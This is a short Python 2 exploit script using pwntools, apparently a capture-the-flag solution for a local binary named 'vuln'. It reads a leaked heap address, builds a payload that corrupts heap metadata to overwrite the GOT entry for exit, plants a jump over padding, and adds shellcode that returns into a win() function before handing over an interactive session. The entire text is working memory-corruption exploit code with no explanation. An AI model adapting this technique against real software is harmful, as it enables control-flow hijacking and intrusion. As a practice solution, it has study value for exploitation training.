#!/usr/bin/env python2
from pwn import *
EXIT_AT_GOT = 0x0804D02C
context.arch = 'i386'
p = process(['./vuln','useless'])
print(p.recvline())
first_addr = int(p.recvline()[:-1])
payload = struct.pack('<I',EXIT_AT_GOT-12)
payload += struct.pack('<I',first_addr+8) # shellcode address
payload += '\xeb\x0cjump12chars_' # jump over garbage
payload += asm('push 0x08048966;ret') # return to win()
p.sendline(payload)
p.interactive()